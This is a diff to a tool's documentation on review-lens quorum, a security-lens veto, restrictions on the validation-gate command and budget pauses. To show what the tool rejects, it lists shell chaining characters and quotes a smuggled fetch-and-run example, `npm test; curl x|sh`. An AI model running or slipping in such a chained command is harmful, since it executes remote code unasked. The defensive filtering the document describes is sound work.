@@ -167,8 +167,12 @@ full 5-lens gate for hard ones.
 
 **Resolution** for a task's lenses: per-task `lenses` → `review.lensesByComplexity[tier]`
 → `review.lenses` → the cost-aware default. **Quorum**: `all` means every lens
-must approve (recommended — a single security blocker stops the merge); an
-integer N means at least N of the applied lenses must approve.
+must approve (recommended); an integer N means at least N of the applied
+lenses must approve.
+
+**Security is a hard veto.** Regardless of quorum, if the `security` lens
+requests changes the task is `changes_requested` — a single vulnerability
+should never be outvoted. (Configured as `VETO_LENSES` in `orch-protocol.js`.)
 
 Per-task overrides: `task.lenses` (which lenses), `task.profileId` /
 `task.reviewerProfileId` (which models).
@@ -185,9 +189,14 @@ only if it passes (exit 0), else `blocked` with the output — the master then
 adds fix tasks and re-opens the chunk. Set `policy.gatesEnabled: false` to
 disable. Timeout: 10 minutes per gate.
 
-> **Trust note:** `validateCmd` runs a shell command in your repo. It comes
-> from the New-run dialog (you) or `run.json`. Treat it like any command you'd
-> run yourself; don't point a run at an untrusted `run.json`.
+> **Safety:** `validateCmd` must be a **single command with arguments** —
+> Switchboard rejects anything that chains, redirects, or substitutes
+> (`;`, `&&`, `|`, `$(...)`, backticks, `>`, newlines, globs, …). A rejected
+> command blocks the chunk with a `gate-rejected` event instead of running.
+> `npm test`, `npm run test:auth`, `pytest -q` are fine; `npm test; curl x|sh`
+> is refused. Commands are length-capped at 4096 chars. Even so, the command
+> runs in your shell in your repo — don't point a run at an untrusted
+> `run.json`.
 
 ---
 
@@ -201,6 +210,10 @@ auto-pauses the run and nudges the master.
 | `policy.maxOutputTokens` | Always works (tokens are always recorded). |
 | `policy.maxBudgetUsd` | Only fires when the session transcripts carry real cost figures (provider-dependent); otherwise inert. |
 
+When paused, **already-running sessions keep going** (Switchboard won't kill
+your interactive terminals) — they may push spend a little past the cap before
+they finish; only *new* spawns are stopped. The pause nudge is sent once per
+episode (resuming while still over budget re-pauses without re-spamming).
 Resume by raising the cap (edit `run.json`) and setting `status` back to
 `active`, or finish manually.
 
